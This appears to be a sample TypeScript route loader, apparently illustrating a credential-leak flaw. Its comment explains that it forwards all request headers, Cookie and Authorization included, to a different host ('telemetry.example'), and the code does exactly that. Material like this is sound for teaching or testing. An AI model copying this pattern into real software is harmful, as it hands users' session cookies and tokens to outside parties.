/**
 * Copying the ambient request headers is safe only while the request stays on the
 * caller's host, or after every ambient credential has been removed. This route changes
 * the URL authority and forwards the collection intact, so both Cookie and Authorization
 * cross the trust boundary without ever appearing as individual values.
 */
export async function loader({ request }: { request: Request }) {
  const target = new URL("https://app.example/ingest");
  target.hostname = "telemetry.example";
  const headers = new Headers(request.headers);

  return fetch(target, { headers });
}
